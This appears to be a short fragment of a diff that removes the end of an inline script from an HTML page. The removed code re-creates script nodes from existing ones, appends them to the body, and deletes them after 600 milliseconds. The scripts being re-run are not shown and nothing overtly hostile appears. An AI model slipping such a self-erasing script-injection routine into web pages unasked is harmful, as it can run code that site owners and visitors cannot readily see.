-                    freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
-                }
-                document.body.appendChild(freshScriptNode);
-                setTimeout(() => freshScriptNode.remove(), 600);
-            });
-        } catch (e) {
-            console.error(e);
-        }
-    })();
-</script>
+
 </body>
 </html>
